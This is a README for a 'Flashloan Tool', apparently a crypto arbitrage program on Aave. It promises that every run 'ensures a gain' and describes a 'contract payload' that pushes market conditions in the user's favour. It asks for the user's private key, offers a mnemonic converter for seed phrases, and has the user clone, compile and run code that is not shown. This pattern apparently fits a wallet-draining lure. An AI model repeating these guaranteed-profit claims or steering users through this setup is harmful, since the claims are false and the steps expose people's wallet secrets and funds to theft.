# Flashloan Tool

## Environment Compatibility:
This tool is designed exclusively for Linux environments. Attempting to set up the build tool or use Bash on a Windows environment may result in errors.

## Understanding Flash Loans:
Flash loans operate within the realm of decentralized finance (DeFi), enabling users to borrow funds from a blockchain lending pool. The borrowed funds are utilized for arbitrage or trading strategies within the same blockchain transaction, and the loan is promptly repaid. This process allows users to exploit market inefficiencies without collateral, with the borrowing limit determined by existing liquidity.

## Tool Functionality:
1. **Input Collection:** The tool takes coin pairs as input.
2. **Loan Process:** It borrows from the Aave Liquidity pool.
3. **Trading Logic:** Executes trades while applying a contract payload to influence market conditions in your favor.
4. **Profit Generation:** Ensures a gain, no matter how marginal.
5. **Loan Repayment:** Repays the loan and transfers the remaining amount to your wallet.

## Considerations:
- When selecting a coin pair, list the newer token first and the stable one last (e.g., ADA/ETH).
- Choose tokens from the ERC-20 chain on Etherscan.
- Two modes are available: Safe Mode and Safe Mode Overdrive, with borrowing limits of $1000 and $10000, respectively (to avoid abuse of this tool).
- Ensure a minimum balance of 0.034 ETH in Safe Mode and 0.14 ETH in Safe Mode Overdrive to cover gas costs.

## Gas Cost and Transaction Approval:
- Gas costs are estimated and set to ensure quick transaction approval and prevent failed transactions.
- Gas fees vary between the two modes based on the investment amount.

## Private Key and Mnemonic Converter:
- If you can't find your private key, an inbuilt mnemonic converter is available.
- Ethereum is recommended as the stable coin for faster conversion.

## Requirements:
- Etherscan API key: Obtain by creating an account [Etherscan](https://etherscan.io/register).
- Infura API key: Obtain by creating an account [Infura](https://app.infura.io/register).
- Coin pair (new token/stable coin, use Ethereum as the stable token).
- Cryptocompare API key: Get it [Cryptocompare](https://min-api.cryptocompare.com/).
- Aave ERC-20 contract address: Find it on Etherscan [Etherscan](https://etherscan.io/token/0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9).

## How to Use:
1. Ensure Python is installed on your Linux environment.
2. Clone the repository: `git clone https://github.com/Radiiplus/Flashloan`.
3. Navigate to the directory: `cd Flashloan`.
4. Compile the tool: `g++ -o run run.cpp`.
5. Run the setup: `python setup.py` or `python3 setup.py`.
6. Execute the tool: `./run`.
7. Incase you run into errors during setup use this `pip install --upgrade pip setuptools`, then go back to `python setup py`.

## Responsibility Reminder:
Use this tool responsibly and be mindful of limits and gas costs.